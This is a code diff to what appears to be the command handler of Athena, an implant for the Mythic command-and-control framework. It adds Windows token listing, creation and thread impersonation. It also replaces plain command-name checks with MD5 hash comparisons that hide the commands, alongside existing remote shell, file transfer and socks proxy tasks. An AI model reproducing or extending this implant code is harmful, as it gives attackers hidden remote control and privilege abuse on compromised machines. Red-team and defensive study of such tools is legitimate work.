@@ -1,4 +1,7 @@
-﻿using Athena.Models.Athena.Commands;
+﻿#if DEBUG
+    #define WINBUILD
+#endif
+using Athena.Models.Athena.Commands;
 using Athena.Models.Mythic.Tasks;
 using Athena.Utilities;
 using System;
@@ -28,10 +31,13 @@ namespace Athena.Commands
         public event EventHandler<TaskEventArgs> ExitRequested;
 
         private ConcurrentDictionary<string, MythicJob> activeJobs { get; set; }
-        private AssemblyHandler assemblyHandler { get; set; }
-        private DownloadHandler downloadHandler { get; set; }
-        private ShellHandler shellHandler { get; set; }
-        private UploadHandler uploadHandler { get; set; }
+        private AssemblyHandler assemblyHandler { get; }
+        private DownloadHandler downloadHandler { get; }
+        private ShellHandler shellHandler { get; }
+        private UploadHandler uploadHandler { get; }
+#if WINBUILD
+        private TokenHandler tokenHandler { get; }
+#endif
         private ConcurrentBag<object> responseResults { get; set; }
         public CommandHandler()
         {
@@ -41,6 +47,11 @@ namespace Athena.Commands
             this.shellHandler = new ShellHandler();
             this.uploadHandler = new UploadHandler();
             this.responseResults = new ConcurrentBag<object>();
+
+#if WINBUILD
+
+            this.tokenHandler = new TokenHandler();
+#endif
         }
         /// <summary>
         /// Initiate a task provided by the Mythic server
@@ -50,8 +61,23 @@ namespace Athena.Commands
         {
             MythicJob job = activeJobs.GetOrAdd(task.id, new MythicJob(task));
             job.started = true;
-
-            switch (Misc.CreateMD5(job.task.command.ToLower())) //To lower "just in case"
+#if WINBUILD
+            if(task.token != 0)
+            {
+                if(!await this.tokenHandler.ThreadImpersonate(task.token))
+                {
+                    this.responseResults.Add(new ResponseResult()
+                    {
+                        task_id = task.id,
+                        user_output = "Failed to impersonate!",
+                        status = "errored",
+                        completed = "true",
+                    });
+                    return;
+                }
+            }
+#endif
+            switch (job.task.command.ToHash())
             {
                 case "FD456406745D816A45CAE554C788E754": //download
                     if (!await downloadHandler.ContainsJob(job.task.id))
@@ -118,7 +144,9 @@ namespace Athena.Commands
                     break;
                 case "3E5A1B3B990187C9FB8E8156CE25C243": //socks
                     var socksInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
-                    if((string)socksInfo["action"] == "start")
+
+
+                    if (((string)socksInfo["action"]).IsEqualTo("EA2B2676C28C0DB26D39331A336C6B92")) //start
                     {
                         StartSocksProxy(job);
                     }
@@ -137,6 +165,21 @@ namespace Athena.Commands
                     });
                     this.activeJobs.Remove(task.id, out _);
                     break;
+#if WINBUILD
+                case "94A08DA1FECBB6E8B46990538C7B50B2": //token
+                    var tokenInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
+                    if (String.IsNullOrEmpty((string)tokenInfo["username"]))
+                    {
+                        this.responseResults.Add(await this.tokenHandler.ListTokens(job));
+                    }
+                    else
+                    {
+                        this.responseResults.Add(await this.tokenHandler.CreateToken(job));
+                    }
+
+                    this.activeJobs.Remove(task.id, out _);
+                    break;
+#endif
                 case "695630CFC5EB92580FB3E76A0C790E63": //unlink
                     StopInternalForwarder(job);
                     this.activeJobs.Remove(task.id, out _);
@@ -155,6 +198,12 @@ namespace Athena.Commands
                     this.responseResults.Add(await CheckAndRunPlugin(job));
                     break;
             }
+#if WINBUILD
+            if (task.token != 0)
+            {
+                await this.tokenHandler.ThreadRevert();
+            }
+#endif
         }
         /// <summary>
         /// EventHandler to begin exit
@@ -391,7 +440,7 @@ namespace Athena.Commands
                 {
                     task_id = response.task_id,
                     status = "error",
-                    user_output = "No file_id received from Mythic",
+                    user_output = "No file_id received",
                     completed = "true"
                 });
             }
